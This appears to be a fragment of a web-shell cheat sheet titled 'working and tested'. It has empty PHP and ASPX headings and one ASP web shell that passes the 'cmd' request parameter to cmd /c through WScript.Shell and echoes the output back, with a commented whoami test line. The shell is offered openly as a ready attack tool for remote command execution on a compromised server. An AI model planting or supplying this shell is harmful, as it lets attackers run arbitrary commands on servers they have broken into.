# Web Shells (working and tested)
## PHP
## ASP
<pre>
&lt;%
Set rs = CreateObject("WScript.Shell")
'Set cmd = rs.Exec("cmd /c whoami")
Set cmd = rs.Exec("cmd /c " & request("cmd"))
o = cmd.StdOut.Readall()
Response.write(o)
%&gt;
</pre>
## ASPX
...
